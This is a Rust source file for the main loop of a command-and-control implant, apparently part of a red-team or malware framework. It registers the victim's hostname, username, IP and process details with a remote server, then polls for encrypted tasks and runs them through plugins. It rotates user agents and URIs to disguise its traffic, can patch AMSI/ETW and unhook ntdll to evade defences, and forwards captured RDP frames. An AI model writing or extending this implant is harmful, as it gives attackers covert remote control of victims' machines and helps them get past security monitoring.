// Agent main loop — registration + polling checkin, matching Go agent main.go.
//
// M0 goal: interop with the existing Go server:
//   1. register (RSA handshake + AES session keys)
//   2. poll /api/v1/checkin, receive encrypted task JSON, decrypt
//   3. (task dispatch + results come in M1)

use crate::protocol::types::{RegisterData, Task};
use crate::transport::http::HttpTransport;
use std::process;

#[derive(Clone)]
pub struct AgentConfig {
    pub server_host: String,
    pub server_port: u16,
    pub rsa_pub_pem: String,
    pub psk: String,
    pub sleep_ms: u64,
    pub jitter: u64,
    /// Transport selector: "http" (default) or "tcp".
    pub transport: String,
    /// URL scheme for HTTP transport: "http" (default) or "https".
    pub scheme: String,
    /// Malleable-style traffic profile (custom URIs / UA rotation).
    pub traffic_profile: Option<TrafficProfile>,
}

/// Malleable traffic shaping (mirrors Go TrafficProfileCfg).
#[derive(Clone, Default, Debug, serde::Serialize)]
pub struct TrafficProfile {
    pub user_agents: Vec<String>,
    pub uris: Vec<String>,
    pub register_uri: String,
    pub checkin_uri: String,
    pub pubkey_uri: String,
}

impl TrafficProfile {
    /// Resolve the URI for a fixed endpoint, applying the profile.
    pub fn resolve_uri(&self, base: &str, fixed: &str, rotate: &mut usize) -> String {
        // Pinned per-endpoint URI wins (from the listener's Malleable profile).
        let pinned = match fixed {
            "/api/v1/register" => &self.register_uri,
            "/api/v1/checkin" => &self.checkin_uri,
            "/api/v1/pubkey" => &self.pubkey_uri,
            _ => "",
        };
        if !pinned.is_empty() {
            return format!("{base}{pinned}");
        }
        if !self.uris.is_empty() {
            let idx = *rotate % self.uris.len();
            *rotate = (*rotate + 1) % self.uris.len();
            return format!("{base}{}", self.uris[idx]);
        }
        format!("{base}{fixed}")
    }

    /// Pick the next user agent (rotating), if any.
    pub fn user_agent(&self, rotate: &mut usize) -> Option<String> {
        if self.user_agents.is_empty() {
            return None;
        }
        let idx = *rotate % self.user_agents.len();
        *rotate = (*rotate + 1) % self.user_agents.len();
        Some(self.user_agents[idx].clone())
    }
}

impl AgentConfig {
    /// Load config from (priority): env vars, then a wisp-agent.conf file next
    /// to the executable (KEY=VALUE lines), then defaults.
    /// Production builds will bake these in at compile time (see build.rs).
    pub fn from_env() -> Self {
        let file_vals = read_conf_file();
        let get = |k: &str, def: &str| -> String {
            std::env::var(k)
                .ok()
                .filter(|v| !v.is_empty())
                .or_else(|| file_vals.get(k).cloned().filter(|v| !v.is_empty()))
                .unwrap_or_else(|| def.to_string())
        };

        AgentConfig {
            server_host: get("WISP_SERVER", "192.168.1.31"),
            server_port: get("WISP_PORT", "5008").parse().unwrap_or(5008),
            rsa_pub_pem: get("WISP_RSA_PUB", ""),
            psk: get("WISP_PSK", "testpsk"),
            sleep_ms: get("WISP_SLEEP", "5000").parse().unwrap_or(5000),
            jitter: 0,
            transport: get("WISP_TRANSPORT", "http"),
            scheme: get("WISP_SCHEME", "http"),
            traffic_profile: None,
        }
    }
}

/// Read a simple KEY=VALUE config file named wisp-agent.conf located next to
/// the executable (or in the CWD). Used for quick field testing on the target.
/// WISP_RSA_PUB spans multiple lines (PEM), so continuation lines are appended
/// until the next KEY= line.
fn read_conf_file() -> std::collections::HashMap<String, String> {
    use std::path::Path;
    let mut map = std::collections::HashMap::new();
    let candidates = [
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join("wisp-agent.conf")))
            .unwrap_or_else(|| Path::new("wisp-agent.conf").to_path_buf()),
        Path::new("wisp-agent.conf").to_path_buf(),
    ];
    for path in candidates {
        if let Ok(content) = std::fs::read_to_string(&path) {
            let mut cur_key: Option<String> = None;
            for raw in content.lines() {
                let line = raw.trim();
                if line.is_empty() {
                    continue;
                }
                if line.starts_with('#') {
                    continue;
                }
                if let Some((k, v)) = line.split_once('=') {
                    let k = k.trim().to_string();
                    cur_key = Some(k.clone());
                    map.insert(k, v.trim().to_string());
                } else if let Some(k) = &cur_key {
                    // continuation line: append (multi-line PEM)
                    if let Some(existing) = map.get_mut(k) {
                        existing.push('\n');
                        existing.push_str(line);
                    }
                }
            }
            break;
        }
    }
    map
}

/// Generate an 8-byte random hex agent ID (16 hex chars) — matches Go generateID().
pub fn generate_id() -> String {
    let mut b = [0u8; 8];
    rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut b);
    hex::encode(b)
}

fn get_username() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("USER").unwrap_or_else(|_| "unknown".into())
    }
}

fn get_hostname() -> String {
    hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "unknown".into())
}

fn get_internal_ip() -> String {
    let host = std::env::var("WISP_SERVER").unwrap_or_else(|_| "192.168.1.31".into());
    if let Ok(sock) = std::net::UdpSocket::bind("0.0.0.0:0") {
        if sock.connect((host.as_str(), 9)).is_ok() {
            if let Ok(local) = sock.local_addr() {
                return local.ip().to_string();
            }
        }
    }
    "0.0.0.0".into()
}

fn build_register_data(id: &str, cfg: &AgentConfig) -> RegisterData {
    #[cfg(target_os = "windows")]
    let os = "windows";
    #[cfg(target_os = "linux")]
    let os = "linux";

    RegisterData {
        id: id.to_string(),
        hostname: get_hostname(),
        username: get_username(),
        domain: String::new(),
        internal_ip: get_internal_ip(),
        os: format!("{} {}", os, std::env::consts::ARCH),
        arch: std::env::consts::ARCH.to_string(),
        pid: process::id(),
        process_name: std::env::current_exe()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_else(|_| "wisp_agent".into()),
        is_elevated: false,
        sleep: cfg.sleep_ms,
        jitter: cfg.jitter,
        psk: cfg.psk.clone(),
    }
}

/// Parse decrypted task JSON into Task structs.
pub fn parse_tasks(data: &[u8]) -> Vec<Task> {
    if data.is_empty() || data == b"[]" {
        return Vec::new();
    }
    serde_json::from_slice(data).unwrap_or_default()
}

/// M0/M1 core: register then poll; M1 will dispatch tasks to plugins.
pub fn agent_run(_is_dll: bool) {
    let cfg = crate::overlay::load_with_overlay();

    // Optional evasion bootstrap at startup (WISP_EVASION=1): warm SSNs, patch
    // AMSI/ETW, unhook ntdll. Each step is panic-protected.
    #[cfg(feature = "evasion")]
    if std::env::var("WISP_EVASION").map(|v| v == "1").unwrap_or(false) {
        crate::evasion::apply_evasion();
        eprintln!("[agent] evasion applied");
    }

    if cfg.rsa_pub_pem.is_empty()
        && cfg.transport != "tcp"
        && cfg.transport != "kcp"
        && cfg.transport != "quic"
    {
        eprintln!("[agent] no RSA key: no conf file and no overlay (reflective) config");
        return;
    }

    let file_vals = read_conf_file();
    let id = std::env::var("WISP_AGENT_ID")
        .ok()
        .filter(|v| !v.is_empty())
        .or_else(|| file_vals.get("WISP_AGENT_ID").cloned().filter(|v| !v.is_empty()))
        .unwrap_or_else(generate_id);
    let reg_json = serde_json::to_vec(&build_register_data(&id, &cfg)).unwrap();

    // Build plugin registry (feature-gated; unloaded plugins have no commands).
    let mut ctx = crate::registry::AgentCtx::new(cfg.clone());
    let mut disp = crate::registry::Dispatcher::new();
    if let Err(e) = crate::plugins::register_all(disp.registry_mut()) {
        eprintln!("[agent] plugin register error: {e}");
    }

    let mut tp: Box<dyn crate::transport::AgentTransport> = match cfg.transport.as_str() {
        "tcp" => {
            let mut t = crate::transport::tcp::TcpTransport::new(
                &cfg.server_host,
                cfg.server_port,
                &id,
                &cfg.rsa_pub_pem,
            );
            t.set_codec(Box::new(crate::protocol::codec::DefaultCodec::new(
                [0u8; 32],
                [0u8; 32],
            )));
            Box::new(t)
        }
        "kcp" => Box::new(crate::transport::kcp::KcpTransport::new(
            &cfg.server_host,
            cfg.server_port,
            &id,
            &cfg.rsa_pub_pem,
        )),
        "quic" => Box::new(crate::transport::quic::QuicTransport::new(
            &cfg.server_host,
            cfg.server_port,
            &id,
            &cfg.rsa_pub_pem,
        )),
        _ => {
            let mut h = HttpTransport::new(&cfg.server_host, cfg.server_port, &id, &cfg.rsa_pub_pem);
            h.set_profile(cfg.traffic_profile.clone());
            Box::new(h)
        }
    };

    // Register with backoff (matches Go: min 1s, double to 60s cap)
    let mut backoff = std::time::Duration::from_millis(cfg.sleep_ms.max(1000));
    loop {
        match tp.register(&reg_json) {
            Ok(_) => {
                println!("[agent] registered as {id}");
                // Inject RCP session state (agent id + negotiated keys).
                #[cfg(feature = "rcp")]
                {
                    crate::plugins::rcp::set_agent_id(&id);
                    crate::plugins::rcp::set_rsa_key(&tp.rsa_pub_pem());
                    if let Some(k) = tp.session_keys() {
                        crate::plugins::rcp::set_session_keys(k);
                    }
                }
                break;
            }
            Err(e) => {
                eprintln!("[agent] register failed: {e}; retry in {:?}", backoff);
                std::thread::sleep(backoff);
                backoff = (backoff * 2).min(std::time::Duration::from_secs(60));
            }
        }
    }

    // Main checkin loop: dispatch tasks, collect results, submit next checkin.
    loop {
        let sleep = cfg.sleep_ms + jitter_offset(cfg.sleep_ms, cfg.jitter);
        std::thread::sleep(std::time::Duration::from_millis(sleep));

        // Serialize pending results (from prior dispatch) into the checkin.
        // Collect any RDP frames queued by the capture thread.
        #[cfg(feature = "rdp")]
        {
            let frames = crate::plugins::rdp::drain_frames();
            for f in frames {
                ctx.pending.push(f);
            }
        }
        let results_json = if ctx.pending.is_empty() {
            None
        } else {
            let body = serde_json::to_vec(&ctx.pending).unwrap_or_default();
            ctx.pending.clear();
            Some(body)
        };

        match tp.checkin(results_json.as_deref()) {
            Ok(task_data) => {
                let tasks = parse_tasks(&task_data);
                for t in tasks {
                    // Dispatch; queue result (sync commands return immediately).
                    if let Some(r) = disp.dispatch(&mut ctx, &t) {
                        ctx.pending.push(r);
                    }
                    if !ctx.running {
                        break;
                    }
                }
                if !ctx.running {
                    break;
                }
            }
            Err(e) => {
                eprintln!("[agent] checkin failed: {e}");
                // Reauth → re-register with backoff
                if e.to_string().contains("reauth") {
                    loop {
                        if tp.register(&reg_json).is_ok() {
                            tp.reset_seq(); // new session => seq restarts
                            break;
                        }
                        std::thread::sleep(backoff);
                    }
                }
            }
        }
    }
}

pub fn jitter_offset(sleep: u64, jitter: u64) -> u64 {
    if jitter == 0 || jitter > 100 {
        return 0;
    }
    let max = sleep.saturating_mul(jitter) / 100;
    use rand::Rng;
    rand::rngs::OsRng.gen_range(0..=max)
}
